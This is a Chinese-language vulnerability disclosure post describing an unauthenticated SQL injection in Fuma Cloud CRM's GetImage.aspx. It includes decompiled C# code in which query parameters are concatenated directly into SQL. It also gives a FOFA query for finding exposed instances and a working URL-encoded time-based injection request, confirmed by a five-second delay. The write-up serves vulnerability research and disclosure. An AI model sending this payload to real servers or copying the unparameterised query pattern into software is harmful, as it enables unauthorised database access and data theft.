---
title: "孚盟云CRM GetImage.aspx SQL注入漏洞"
source: https://mrxn.net/jswz/fumacrm-GetImage-MouldID-sqli.html
asset_dir: assets/孚盟云crm-getimage.aspx-sql注入漏洞
---

# 孚盟云CRM GetImage.aspx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/17 08:30
- 1171浏览
- [0评论](#comment)
- 16分钟阅读

深入探索

鉴权

认证

软件

---

# 漏洞简介

上海孚盟软件有限公司是一家专业的外贸SaaS服务和行业解决方案提供商。其旗下产品孚盟云GetImage.aspx接口存在 [SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。

# 影响版本

# fofa语法

> app="孚盟软件-孚盟云"

# 漏洞分析

直接看 `Common/GetImage.aspx` 对应的dll文件 `FumaCRM_BS.NewWeb.dll` 里有关 `GetImage` 方法的实现如下

```
public class GetImage : Page
{
  private DbHelperSql dbHelper = new DbHelperSql(UserCookie.GetCookieValue("corpId"));
  protected HtmlForm form1;

  protected void Page_Load(object sender, EventArgs e)
  {
    try
    {
      string str1 = this.Request.QueryString["MouldID"];
      string str2 = this.Request.QueryString["pkField"];
      string str3 = this.Request.QueryString["Field"];
      string str4 = Base64.base64Decode(this.Request.QueryString[str2]);
      string str5 = this.Request.QueryString["SqlNo"];
      if (string.IsNullOrEmpty(str5))
        str5 = "1";
      string str6 = this.dbHelper.Query($"select TableName from syMouldTables where MouldID='{str1}' and SqlNo={str5} and IsUpdate=1").Tables[0].Rows[0][0].ToString();
      byte[] numArray = this.dbHelper.Query($"select {str3} from {str6} where {str2}={str4}").Tables[0].Rows[0][0] as byte[];
      MemoryStream memoryStream = new MemoryStream(numArray);
      this.Response.Clear();
      this.Response.ContentType = "image/gif";
      this.Response.OutputStream.Write(numArray, 0, numArray.Length);
      this.Response.End();
```

未经过滤或参数化绑定的参数 `MouldID` 被直接拼接进SQL语句中进行执行，造成[SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。

# 漏洞复现

```
GET /Common/GetImage.aspx?MouldID=%2d%31%27%57%41%49%54%46%4f%52%20%44%45%4c%41%59%27%30%3a%30%3a%35%27%2d%2d HTTP/1.1
Host: fumacrm.mrxn.net
```

[![孚盟云CRM GetImage.aspx SQL注入漏洞](images/img-001-e4c4c87f1d61.webp)](https://image.mrxn.net/ebeb899e8d6a45869e3a5f8badd4914b.webp)

成功延时 5 秒

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#0day](https://mrxn.net/tag/0day)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
